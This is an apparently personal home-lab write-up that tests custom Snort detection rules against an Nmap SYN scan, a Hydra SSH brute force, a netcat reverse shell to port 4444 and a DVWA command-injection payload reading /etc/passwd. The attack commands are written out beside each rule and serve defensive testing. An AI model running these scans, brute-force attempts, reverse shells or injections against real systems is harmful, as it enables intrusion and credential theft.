# Snort Detection Testing

This document contains testing and validation of custom Snort rules developed for the home lab environment.

The tests were performed using:
- Kali Linux (attacker)
- Metasploitable2 (target)
- pfSense Snort

---

# Nmap SYN Scan Detection

## Objective

Detect SYN reconnaissance scans generated by Nmap.

---

## Attack Performed

```bash
sudo nmap -sS 172.30.2.102
```

---

## Detection Rule

```snort
alert tcp any any -> $HOME_NET any (msg:"Nmap SYN Scan Detected";flags:S;threshold:type both, track by_src, count 20, seconds 10;sid:1000003;rev:1;)
```

---

## Detection Logic

This rule detects:
- TCP packets with SYN flags
- More than 20 packets
- Within 10 seconds
- From the same source IP

---

## Expected Behaviour

Snort generates an alert after the threshold is exceeded.

# SSH Brute Force Detection

## Objective

Detect repeated SSH authentication attempts.

---

## Attack Performed

Create small password list:

```bash
nano passwords.txt
```

Example contents:

```text
admin
password
test
msfadmin
```

Run Hydra:

```bash
hydra -l msfadmin -P passwords.txt ssh://172.30.2.102
```

---

## Detection Rule

```snort
alert tcp any any -> $HOME_NET 22 (msg:"Potential SSH Brute Force";flow:to_server,established;threshold:type both, track by_src, count 5, seconds 60;sid:1000005;rev:1;)
```

---

## Detection Logic

This rule detects:
- Established TCP connections
- Repeated SSH attempts
- More than 5 attempts in 60 seconds

---

## Expected Behaviour

Snort generates alerts when repeated SSH attempts exceed the threshold.

---

# Reverse Shell Detection

## Objective

Detect outbound reverse shell behaviour.

---

## Attack Performed

Start listener on Kali:

```bash
nc -lvnp 4444
```

Launch reverse shell from target:

```bash
nc 172.30.2.X 4444 -e /bin/bash
```

Replace `172.30.2.X` with the Kali IP address.

---

## Detection Rule

```snort
alert tcp $HOME_NET any -> any 4444 (msg:"Possible Reverse Shell";flow:to_server,established;sid:1000007;rev:1;)
```

---

## Detection Logic

This rule detects:
- Outbound TCP traffic
- Destination port `4444`

Port `4444` is commonly used in reverse shell demonstrations and Metasploit payloads.

---

## Expected Behaviour

Snort generates alerts when the target establishes the reverse shell connection.

# Web Command Injection Detection

## Objective

Detect suspicious HTTP requests associated with command injection attempts.

---

## Attack Performed

Using DVWA Command Injection module:

```text
127.0.0.1; cat /etc/passwd
```

Alternative curl test:

```bash
curl "http://172.30.2.102/index.php?cmd=cat%20/etc/passwd"
```

---

## Detection Rule

```snort
alert tcp any any -> $HOME_NET 80 (msg:"Possible Command Injection Attempt";content:"cat";http_uri;sid:1000008;rev:1;)
```

---

## Detection Logic

This rule searches HTTP URIs for:
```text
cat
```

The `cat` command is commonly used during command injection attempts to read files such as:

```text
/etc/passwd
```

---

## Expected Behaviour

Snort generates alerts when suspicious command strings appear in HTTP requests.
